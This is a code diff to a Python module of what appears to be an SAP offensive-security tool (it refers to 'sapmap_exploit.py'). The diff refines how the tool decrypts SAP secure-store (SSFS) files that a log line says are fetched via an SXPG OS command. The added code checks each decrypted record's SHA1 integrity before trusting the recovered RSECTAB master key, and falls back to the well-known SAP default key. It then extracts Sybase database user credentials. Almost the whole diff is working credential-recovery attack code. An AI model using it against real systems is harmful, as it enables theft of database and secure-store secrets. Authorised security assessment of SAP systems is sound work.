@@ -342,11 +342,14 @@ def _decode_ssfs_encrypted_value(payload: bytes) -> str:
 
         [ 0 ..  7]  8-byte header (session-specific salt-shaped bytes)
         [ 8 .. 11]  val_len — big-endian uint32
-        [12 .. 31]  20 bytes — HMAC-SHA1 tag over the value
+        [12 .. 31]  20 bytes — keyless SHA1 over preamble+length+value+padding,
+                               the hash field itself excluded (see
+                               _ssfs_payload_valid; matches pysap
+                               SAPSSFSDecryptedPayload.valid — NOT an HMAC)
         [32 .. 32 + val_len]  the actual value (ASCII)
         [32 + val_len ..]  block padding
 
-    The 20-byte HMAC + 8-byte header prefix is common to every encrypted
+    The 20-byte SHA1 + 8-byte header prefix is common to every encrypted
     SSFS value record (RSECTAB entries have a different envelope handled
     by the existing decrypt_entry chain, so those stay on their own path).
     """
@@ -362,6 +365,93 @@ def _decode_ssfs_encrypted_value(payload: bytes) -> str:
     if len(payload) < 32 + val_len:
         return ""
     return _decode_ssfs_plaintext_value(payload[32:32 + val_len])
+
+
+def _ssfs_payload_valid(payload: bytes) -> bool:
+    """True if a DECRYPTED SSFS record payload passes its embedded SHA1
+    integrity check — the definitive signal that the SSFS key decrypted this
+    record correctly.  A wrong SSFS key (e.g. the SAP default on a system that
+    does not actually use it) yields a mismatching hash, so this lets callers
+    reject a garbage recovered value instead of trusting it silently (#233).
+
+    Layout (pysap ``SAPSSFSDecryptedPayload``):
+        [ 0 ..  7]  preamble
+        [ 8 .. 11]  length (big-endian uint32)
+        [12 .. 31]  SHA1 hash (20 bytes) — excluded from its own input
+        [32 .. 32+length]  value
+        [32+length ..]     padding
+    The stored hash equals ``SHA1(payload[0:12] + payload[32:])`` — i.e. every
+    byte except the 20-byte hash field itself (keyless SHA1, not HMAC).
+    """
+    if len(payload) < 32:
+        return False
+    try:
+        import hashlib
+        return hashlib.sha1(payload[0:12] + payload[32:]).digest() == payload[12:32]
+    except Exception:
+        return False
+
+
+def _select_ssfs_key(key_bytes, node_sid: str = ""):
+    """Choose the SSFS master key.  Returns ``(key_bytes, source, used_default)``.
+
+    The individual key from the ``SSFS_<SID>.KEY`` file when it is present and
+    parseable; otherwise the well-known SAP default 3DES key — used both when
+    the key file is MISSING and when it is present but ``extract_ssfs_key``
+    raises (issue #233).  ``used_default`` lets callers gate a *guessed* default
+    key with the record integrity check while leaving a trusted individual key
+    alone.
+    """
+    if key_bytes:
+        try:
+            return (extract_ssfs_key(key_bytes),
+                    "individual (SSFS_<SID>.KEY)", False)
+        except Exception as e:
+            print(f"[-] SecStore {node_sid}: could not extract SSFS key "
+                  f"({format_rfc_exception(e)}) — falling back to SAP default")
+    return (bytes.fromhex(DEFAULT_KEY_HEX),
+            "SAP default (no usable SSFS_<SID>.KEY)", True)
+
+
+def _recover_rsectab_key_from_ssfs(ssfs_records, default_key_hex: str,
+                                   used_default: bool,
+                                   node_sid: str = ""):
+    """Scan parsed SSFS records for the ``SECSTORE_DB/KEY/...`` individual
+    RSECTAB key.  Returns ``(key_hex, adopted)`` — ``default_key_hex`` + False
+    when nothing is adopted.
+
+    Integrity policy (issue #233): when the SSFS key was the GUESSED SAP default
+    (``used_default``), a record must pass its embedded SHA1 integrity check
+    (:func:`_ssfs_payload_valid`) before we trust the key it carries — a wrong
+    default decrypts to garbage, so we skip it (``continue``) and keep the
+    default RSECTAB key.  When the key came from the system's own ``.KEY`` file
+    there is no wrong-key risk, so prior behaviour is preserved (adopt), only
+    warning if the hash unexpectedly fails.
+    """
+    for ident, data_hex in ssfs_records or []:
+        if not ident.startswith("SECSTORE_DB/KEY/"):
+            continue
+        raw = bytes.fromhex(data_hex)
+        valid = _ssfs_payload_valid(raw)
+        if not valid and used_default:
+            print(f"[!] SecStore {node_sid}: SSFS record '{ident}' failed its "
+                  f"integrity check with the SAP default SSFS key — not "
+                  f"adopting it, keeping the default RSECTAB key (this "
+                  f"no-key-file system may not use the default SSFS key).")
+            continue
+        if not valid:
+            print(f"[!] SecStore {node_sid}: SSFS record '{ident}' failed its "
+                  f"integrity check under the individual SSFS key (unexpected) "
+                  f"— adopting anyway to preserve prior behaviour.")
+        if len(raw) >= 57:
+            key_hex = raw[33:57].hex()
+            print(f"[+] SecStore {node_sid}: found RSECTAB individual key in "
+                  f"SSFS record '{ident}' (integrity "
+                  f"{'OK' if valid else 'FAILED'})")
+            if key_hex != default_key_hex:
+                print(f"[+] SecStore {node_sid}: key differs from default")
+            return key_hex, True
+    return default_key_hex, False
 
 
 def extract_sybase_kernel_creds(dat_file_bytes: bytes,
@@ -1373,15 +1463,13 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
             ssfs_method = "Method 2 (SSFS files via SXPG OS command)"
             print(f"[+] SecStore {node.sid}: [Method 2] SSFS files retrieved")
 
-    # Extract SSFS master key from KEY file (if available)
-    ssfs_key = None
-    if key_bytes:
-        try:
-            ssfs_key = extract_ssfs_key(key_bytes)
-        except Exception as e:
-            print(f"[-] SecStore {node.sid}: could not extract SSFS key: {format_rfc_exception(e)}")
-    else:
-        ssfs_key = bytes.fromhex (DEFAULT_KEY_HEX)
+    # Choose the SSFS master key: the individual key from SSFS_<SID>.KEY, or —
+    # when that file is missing or unparseable — the well-known SAP default
+    # (issue #233).  A guessed default is only trusted for the SECSTORE_DB/KEY
+    # record below if that record passes its integrity check.
+    ssfs_key, ssfs_key_source, ssfs_used_default = _select_ssfs_key(
+        key_bytes, node.sid)
+    print(f"[*] SecStore {node.sid}: SSFS master key source: {ssfs_key_source}")
 
     # Parse SSFS DAT file — decrypt records with SSFS key, and look for
     # the RSECTAB individual key stored as SECSTORE_DB/KEY/...
@@ -1392,21 +1480,11 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
             ssfs_records = parse_ssfs_dat(dat_bytes, ssfs_key)
             if ssfs_records:
                 print(f"[+] SecStore {node.sid}: {len(ssfs_records)} records from SSFS DAT")
-
-            # Look for the RSECTAB individual key inside the SSFS records.
-            for ident, data_hex in ssfs_records:
-                if ident.startswith("SECSTORE_DB/KEY/"):
-                    raw = bytes.fromhex(data_hex)
-                    if len(raw) >= 57:
-                        val_len = int.from_bytes(raw[8:12], "big")
-                        candidate = raw[33:57]
-                        if len(candidate) == 24:
-                            actual_key_hex = candidate.hex()
-                            print(f"[+] SecStore {node.sid}: found RSECTAB individual key "
-                                  f"in SSFS record '{ident}' (val_len={val_len})")
-                            if actual_key_hex != DEFAULT_KEY_HEX:
-                                print(f"[+] SecStore {node.sid}: key differs from default")
-                    break
+            # Recover the RSECTAB individual key from SECSTORE_DB/KEY/..., gating
+            # a GUESSED default SSFS key on the record integrity check (#233);
+            # a trusted individual key from a .KEY file is adopted as before.
+            actual_key_hex, _adopted = _recover_rsectab_key_from_ssfs(
+                ssfs_records, key_hex, ssfs_used_default, node.sid)
         except Exception as e:
             print(f"[-] SecStore {node.sid}: SSFS DAT parse error: {format_rfc_exception(e)}")
 
@@ -1420,7 +1498,12 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
     # exist on non-Sybase kernels.
     if dat_bytes:
         try:
-            db_creds = extract_sybase_kernel_creds(dat_bytes, ssfs_key)
+            # Pass None when we only have the GUESSED default key, so
+            # extract_sybase_kernel_creds runs its own labelled default-key
+            # fallback and keeps encrypted_missing_key / provenance accurate
+            # (a real individual key is passed through unchanged).
+            db_creds = extract_sybase_kernel_creds(
+                dat_bytes, None if ssfs_used_default else ssfs_key)
             if db_creds.get("sapsa_user") or db_creds.get("sapsr3_user"):
                 # Persist onto the node so the Sybase writer caller in
                 # sapmap_exploit.py can pick it up.  A plain dict field
@@ -1504,14 +1587,14 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
                     if dat_bytes and ssfs_key:
                         try:
                             ssfs_records = parse_ssfs_dat(dat_bytes, ssfs_key)
-                            for ident, dhex in ssfs_records:
-                                if ident.startswith("SECSTORE_DB/KEY/"):
-                                    raw = bytes.fromhex(dhex)
-                                    if len(raw) >= 57:
-                                        candidate = raw[33:57]
-                                        if len(candidate) == 24:
-                                            actual_key_hex = candidate.hex()
-                                    break
+                            # Same integrity policy as the primary lookup; this
+                            # retry uses the alt-client's own .KEY individual
+                            # key, so used_default=False (adopt, warn if the
+                            # hash fails) — issue #233 review.
+                            _k, _ad = _recover_rsectab_key_from_ssfs(
+                                ssfs_records, actual_key_hex, False, node.sid)
+                            if _ad:
+                                actual_key_hex = _k
                         except Exception:
                             pass
 
